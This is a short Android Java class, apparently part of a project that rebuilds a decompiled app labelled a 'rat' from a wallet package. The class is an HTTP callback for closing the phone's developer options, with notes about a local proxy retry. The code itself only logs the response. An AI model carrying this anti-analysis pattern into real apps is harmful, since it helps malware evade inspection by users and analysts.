package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.b (CloseDevelopmentCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * CloseDevelopmentCallback - 关闭开发者选项回调
 * vendor: 解析 ApiResult<Boolean>，成功后日志 "关闭开发者选项成功"
 * 失败时尝试本地代理重试 l.e()
 */
public final class b implements Callback {

    private static final String TAG = "CloseDevelopmentCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
        // ADAPT: vendor retries via local proxy l.e() if URL contains 127.0.0.1:7911
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<Boolean>, logs "关闭开发者选项成功"
            // on failure retries via local proxy if URL contains 127.0.0.1:7911
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
